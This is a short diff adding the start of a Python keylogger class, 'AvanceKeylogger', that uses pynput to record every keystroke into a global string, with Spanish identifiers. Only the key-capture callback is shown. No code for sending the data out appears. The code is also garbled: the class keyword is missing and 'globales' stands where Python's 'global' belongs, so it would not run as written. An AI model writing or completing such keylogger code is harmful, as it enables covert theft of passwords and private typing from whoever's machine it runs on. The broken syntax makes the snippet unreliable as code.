@@ -1,0 +1,16 @@
+import pynput.keyboard
+import threading
+
+
+AvanceKeylogger():
+    def tecla_usuario(self, tecla):
+        
+        globales eventos
+        
+        try:
+            eventos = eventos + str(tecla.char)
+        except:
+            if tecla == tecla.space:
+                eventos = eventos + " "
+            else:
+                eventos = eventos + " " + str(tecla) + " "
